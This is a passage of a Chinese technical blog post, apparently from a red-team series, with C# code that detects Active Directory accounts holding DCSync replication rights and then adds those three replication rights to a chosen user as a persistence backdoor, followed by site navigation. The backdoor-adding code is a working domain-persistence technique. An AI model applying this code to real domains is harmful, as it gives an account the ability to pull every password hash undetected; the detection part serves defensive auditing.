+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</span><br><span class="line">1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</span><br><span class="line">89e95b76-444d-4c62-991a-0facbeda640c</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img15@main/2021/10/01/1633088546852-d4974e77-7b91-4246-a76c-63766d749206.png"></p>
+<p>我们先绑定rootpath为根路径然后先判断拥有完全控制权限的用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if (rule.ActiveDirectoryRights.ToString().Equals(&quot;GenericAll&quot;))</span><br><span class="line">&#123;</span><br><span class="line">    string acl = rule.IdentityReference.Value;</span><br><span class="line">    if (acl.Contains(&quot;-&quot;))</span><br><span class="line">    &#123;</span><br><span class="line">        //域外查询可能会出现用户名为sid的情况。所以需要转换</span><br><span class="line">        //Console.WriteLine(acl);</span><br><span class="line">        string user_name = public_value.SidToUserName(acl);</span><br><span class="line">        if (user_name != &quot;error&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            ACE_Changes.Add(user_name);</span><br><span class="line">            ACE_Changes_All.Add(user_name);</span><br><span class="line">            ACE_Changes_In_Filtered_Set.Add(user_name);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        ACE_Changes.Add(acl);</span><br><span class="line">        ACE_Changes_All.Add(acl);</span><br><span class="line">        ACE_Changes_In_Filtered_Set.Add(acl);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ACE_Changes.Add(acl);</span><br><span class="line">ACE_Changes_All.Add(acl);</span><br><span class="line">ACE_Changes_In_Filtered_Set.Add(acl);</span><br></pre></td></tr></table></figure>
+
+<p>这里我通过switch case来进行判断是否拥有这个三条acl，可能有些用户只有两条或者一条，所以我通过<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">string guids = rule.ObjectType.ToString();</span><br><span class="line">switch (guids)</span><br><span class="line">&#123;</span><br><span class="line">  case &quot;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2&quot;:</span><br><span class="line">    username = dcsync_return_username(rule);</span><br><span class="line">    if(username == null)</span><br><span class="line">    &#123;</span><br><span class="line">    	continue;</span><br><span class="line">    &#125;</span><br><span class="line">    //Console.WriteLine(&quot;ACE:复制目录更改&quot;);</span><br><span class="line">    //Console.WriteLine(&quot;User:&quot;+ username);</span><br><span class="line">    ACE_Changes.Add(username);</span><br><span class="line">    break;</span><br><span class="line">  case &quot;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2&quot;:</span><br><span class="line">    username = dcsync_return_username(rule);</span><br><span class="line">    if (username == null)</span><br><span class="line">    &#123;</span><br><span class="line">    	continue;</span><br><span class="line">    &#125;</span><br><span class="line">    //Console.WriteLine(&quot;ACE:复制目录更改全部&quot;);</span><br><span class="line">    //Console.WriteLine(&quot;User:&quot; + username);</span><br><span class="line">    ACE_Changes_All.Add(username);</span><br><span class="line">    break;</span><br><span class="line">  case &quot;89e95b76-444d-4c62-991a-0facbeda640c&quot;:</span><br><span class="line">    username = dcsync_return_username(rule);</span><br><span class="line">    if (username == null)</span><br><span class="line">    &#123;</span><br><span class="line">    	continue;</span><br><span class="line">    &#125;</span><br><span class="line">    //Console.WriteLine(&quot;ACE:复制过滤集中的目录更改&quot;);</span><br><span class="line">    //Console.WriteLine(&quot;User:&quot; + username);</span><br><span class="line">    ACE_Changes_In_Filtered_Set.Add(username);</span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>来进行处理，当拥有每条acl的时候就添加到一个集合里面，然后我们再取三个集合的交集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//取三个集合的交集</span><br><span class="line">IEnumerable&lt;string&gt; dcsync_users1 = ACE_Changes.Intersect(ACE_Changes_All);</span><br><span class="line">IEnumerable&lt;string&gt; dcsync_users2 = dcsync_users1.Intersect(ACE_Changes_In_Filtered_Set);</span><br><span class="line">foreach(string dcsync_users in dcsync_users2)</span><br><span class="line">&#123;</span><br><span class="line">	Console.WriteLine(dcsync_users);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过以上方法取出来我发现了一个问题当一个用户勾选了特殊权限，他的acl里面那三个复制目录权限是没有打上勾的但是依然能够进行dcsync。<br>​</p>
+<p>再ActiveDirectoryAccessRule类里面存在一个InheritedObjectType属性，他的作用是获取可继承ObjectAccessRule对象的子对象的类型，所以我们也要判断用户这里面的值是否也用户这三条acl。<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">string guids_extend = rule.InheritedObjectType.ToString();</span><br><span class="line">switch (guids_extend)</span><br><span class="line">&#123;</span><br><span class="line">  case &quot;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2&quot;:</span><br><span class="line">  username = dcsync_return_username(rule);</span><br><span class="line">  if (username == null)</span><br><span class="line">  &#123;</span><br><span class="line">  	continue;</span><br><span class="line">  &#125;</span><br><span class="line">  //Console.WriteLine(&quot;ACE:复制目录更改&quot;);</span><br><span class="line">  //Console.WriteLine(&quot;User:&quot;+ username);</span><br><span class="line">  ACE_Changes.Add(username);</span><br><span class="line">  break;</span><br><span class="line">	case &quot;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2&quot;:</span><br><span class="line">    username = dcsync_return_username(rule);</span><br><span class="line">    if (username == null)</span><br><span class="line">    &#123;</span><br><span class="line">    	continue;</span><br><span class="line">    &#125;</span><br><span class="line">    //Console.WriteLine(&quot;ACE:复制目录更改全部&quot;);</span><br><span class="line">    //Console.WriteLine(&quot;User:&quot; + username);</span><br><span class="line">    ACE_Changes_All.Add(username);</span><br><span class="line">    break;</span><br><span class="line">  case &quot;89e95b76-444d-4c62-991a-0facbeda640c&quot;:</span><br><span class="line">  username = dcsync_return_username(rule);</span><br><span class="line">  if (username == null)</span><br><span class="line">  &#123;</span><br><span class="line">  	continue;</span><br><span class="line">  &#125;</span><br><span class="line">  //Console.WriteLine(&quot;ACE:复制过滤集中的目录更改&quot;);</span><br><span class="line">  //Console.WriteLine(&quot;User:&quot; + username);</span><br><span class="line">  ACE_Changes_In_Filtered_Set.Add(username);</span><br><span class="line">  break;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="5-2-添加"><a href="#5-2-添加" class="headerlink" title="5.2 添加"></a>5.2 添加</h2><p>我们通过ExtendedRightAccessRule类来添加这三条acl的guid</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public ExtendedRightAccessRule (System.Security.Principal.IdentityReference identity, System.Security.AccessControl.AccessControlType type, Guid extendedRightType);</span><br></pre></td></tr></table></figure>
+
+<p>第一个为SecurityIdentifier的对象，前面已经说明了。第二个为访问规则类型。第三个为acl的guid。<br>​</p>
+<p>然后通过AddAccessRule来添加。<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ActiveDirectorySecurity adsOUSec = Ldapcoon.coon.ObjectSecurity;</span><br><span class="line">NTAccount ntaToDelegate = new NTAccount(username);</span><br><span class="line">SecurityIdentifier Sid = (SecurityIdentifier)ntaToDelegate.Translate(typeof(SecurityIdentifier));</span><br><span class="line">Guid Get_Changes = new Guid(&quot;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2&quot;);</span><br><span class="line">Guid Get_Changes_All = new Guid(&quot;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2&quot;);</span><br><span class="line">Guid ACE_Changes_In_Filtered = new Guid(&quot;89e95b76-444d-4c62-991a-0facbeda640c&quot;);</span><br><span class="line">ExtendedRightAccessRule Changes = new ExtendedRightAccessRule(ntaToDelegate, AccessControlType.Allow, Get_Changes);</span><br><span class="line">ExtendedRightAccessRule Changes_All = new ExtendedRightAccessRule(ntaToDelegate, AccessControlType.Allow, Get_Changes_All);</span><br><span class="line">ExtendedRightAccessRule Changes_Filtered = new ExtendedRightAccessRule(ntaToDelegate, AccessControlType.Allow, ACE_Changes_In_Filtered);</span><br><span class="line">adsOUSec.AddAccessRule(Changes);</span><br><span class="line">adsOUSec.AddAccessRule(Changes_All);</span><br><span class="line">adsOUSec.AddAccessRule(Changes_Filtered);</span><br><span class="line">Ldapcoon.coon.CommitChanges()</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img15@main/2021/10/01/1633088565777-50f3824e-76ce-434b-b497-6763af4e7baf.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img14@main/2021/10/01/1633088582319-4254af82-8604-4d89-9d9b-77ffc1ecc06d.png"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/10/03/kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E9%97%AE%E9%A2%98/" rel="prev" title="kerberos协议及问题">
+                kerberos协议及问题 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://avatars.githubusercontent.com/u/47177122?v=4"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yicunyiye" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-Ldap%E8%BF%9E%E6%8E%A5"><span class="nav-number">1.</span> <span class="nav-text">0x01 Ldap连接</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1%E5%9F%9F%E5%A4%96%E8%BF%9E%E6%8E%A5"><span class="nav-number">1.1.</span> <span class="nav-text">1.1域外连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-%E5%9F%9F%E5%86%85%E8%BF%9E%E6%8E%A5"><span class="nav-number">1.2.</span> <span class="nav-text">1.2 域内连接</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-Filter%E6%90%9C%E7%B4%A2%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.</span> <span class="nav-text">0x02 Filter搜索条件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-c-%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-number">3.</span> <span class="nav-text">0x03 c#获取域内基本信息</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.1.</span> <span class="nav-text"></span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-AdminSDHolder%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0"><span class="nav-number">4.</span> <span class="nav-text">0x04 AdminSDHolder检测与后门用户添加</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1-%E6%A3%80%E6%B5%8B"><span class="nav-number">4.1.</span> <span class="nav-text">4.1 检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2-%E6%B7%BB%E5%8A%A0"><span class="nav-number">4.2.</span> <span class="nav-text">4.2 添加</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-Dcsync%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0"><span class="nav-number">5.</span> <span class="nav-text">0x05 Dcsync检测与后门用户添加</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#5-1-%E6%A3%80%E6%B5%8B"><span class="nav-number">5.1.</span> <span class="nav-text">5.1 检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-2-%E6%B7%BB%E5%8A%A0"><span class="nav-number">5.2.</span> <span class="nav-text">5.2 添加</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">1</span>
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
